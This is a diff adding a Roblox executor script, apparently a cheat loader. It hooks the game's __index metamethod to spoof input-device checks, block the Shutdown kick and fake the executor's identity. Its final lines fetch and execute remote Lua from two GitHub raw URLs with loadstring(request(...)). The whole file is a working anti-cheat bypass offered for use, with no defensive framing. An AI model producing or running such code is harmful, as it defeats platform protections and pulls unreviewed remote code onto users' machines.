@@ -1,0 +1,25 @@
+local Bypass_Checks; Bypass_Checks = hookmetamethod(game, "__index", newcclosure(function(self, Key)
+    if checkcaller() then
+        if self == game:GetService("UserInputService") then
+            if Key == "TouchEnabled" then
+                return false
+            elseif Key == "KeyboardEnabled" then
+                return true
+            elseif Key == "InputEnded" then
+                return Instance.new("BindableEvent").Event
+            end;
+        end;
+            if self == game and Key == "Shutdown" then return function() end end;
+            if tostring(self) == "InputObject" and Key == "UserInputType" then return Enum.UserInputType.Keyboard 
+        end;
+    end;
+    return Bypass_Checks(self, Key)
+end));
+--
+identifyexecutor = function() return [[Wave]] end;
+--
+messagebox = function(text, title) print("[" .. (title or "MessageBox") .. "] " .. text) end
+--
+loadstring(request({Url='https://raw.githubusercontent.com/mainstreamed/amongus-hook/64d3db161a1b353e0e119d0c536de4334172739f/drawingfix.lua'; Method='GET'}).Body)();
+--
+loadstring(request({Url='https://raw.githubusercontent.com/DHRFV2/Main/refs/heads/main/amoungushookfix/Main.lua'; Method='GET'}).Body)();
